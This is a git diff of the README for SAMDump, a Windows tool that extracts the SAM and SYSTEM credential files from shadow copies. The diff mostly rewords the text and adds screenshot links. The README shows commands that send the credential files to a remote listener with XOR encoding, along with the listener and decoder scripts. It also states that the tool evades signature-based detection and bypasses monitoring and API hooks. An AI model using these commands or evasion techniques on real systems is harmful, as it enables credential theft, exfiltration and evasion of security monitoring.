@@ -1,6 +1,6 @@
 # SAMDump
 
-Extract Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS) with multiple exfiltration options and XOR obfuscation.
+Extracts Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS) with multiple exfiltration options and XOR obfuscation:
 
 - Lists volume shadow copies using VSS and creates one if necessary
 - Extracts SAM and SYSTEM files from shadow copies
@@ -9,9 +9,9 @@ Extract Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS) with
 - Multiple exfiltration methods: local save or network transfer
 
 
-## Usage
+<br>
 
-*SAMDump.exe* is the main executable that uses Windows VSS to create shadow copies and extract credential files:
+## Usage
 
 ```
 SAMDump.exe [OPTIONS]
@@ -34,17 +34,22 @@ Save locally without encoding:
 SAMDump.exe --save-local --output-dir "C:\temp"
 ```
 
+![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_1.png)
+
 Save locally with XOR encoding:
 
 ```
 SAMDump.exe --save-local --xor-encode --xor-key "SAMDump2025"
 ```
 
-Send to remote server with XOR encoding:
+![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_2.png)
+
+Send to remote server with XOR encoding and the default key:
 
 ```
-SAMDump.exe --send-remote --host 192.168.1.100 --port 4444 --xor-encode
+SAMDump.exe --send-remote --host 192.168.1.72 --port 1234 --xor-encode
 ```
+![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_3.png)
 
 
 <br>
@@ -65,8 +70,10 @@ Options:
 Listener on specific interface and port with XOR key:
 
 ```
-python server.py --host 192.168.1.100 --port 4444 --xor-key "SAMDump2025"
+python server.py --host 192.168.1.72 --port 1234 --xor-key "SAMDump2025"
 ```
+
+![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_4.png)
 
 
 <br>
@@ -91,33 +98,36 @@ Decode with default key:
 python xor-decoder.py --sam sam.txt --system system.txt
 ```
 
+![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_5.png)
+
 Decode with custom key and output directory:
 
 ```
 python xor-decoder.py --sam sam.txt --system system.txt --xor-key "MyKey" --output-dir ./results
 ```
 
+![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/samdump/Screenshot_6.png)
+
+
 <br>
 
 ## Motivation
 
-I wanted a tool to automate the process of SAM and SYSTEM dumping. 
+I wanted to automate this process and most Windows I find run VSS, but security solutions detect the use of *vssadmin* to create Shadow Copies and extract these files because it is an old, well-known technique.
 
-This tool extracts the files without writing to the target filesystem when using remote transfer mode. 
+This tool extracts the files without writing to the target filesystem when using remote transfer mode and XOR-encoding offers basic obfuscation to evade signature-based detection (even when using remote mode).
 
-XOR-encoding offers basic obfuscation to evade signature-based detection even when using remote mode.
-
-It leverages direct NT API calls to bypass some security monitoring solutions and user-mode API hooks.
+Plus, it leverages NT API calls to bypass some monitoring and user-mode API hooks.
 
 
 <br>
 
 ## NT API Integration
 
-The tool employs direct NT system calls instead of standard Windows API functions which might bypass some user-mode API hooks commonly monitored:
+The tool employs NT system calls instead of standard Windows API functions, which might bypass some user-mode API hooks commonly monitored:
 
-- NtCreateFile/NtReadFile: To open a handle and read the bytes of the SAM and SYSTEM files in the Shadow Copy.
+- *NtCreateFile* and *NtReadFile*: Used to open a handle and read the bytes of the SAM and SYSTEM files in the Shadow Copy
 
-- NtWriteFile: To save the files locally.
+- *NtWriteFile*: Used to save the files locally
 
-- Direct memory manipulation: Custom GetProcAddress implementation to resolve function addresses without standard library calls using NtReadVirtualMemory.
+- It uses a custom *GetProcAddress* implementation to resolve function addresses using only *NtReadVirtualMemory*
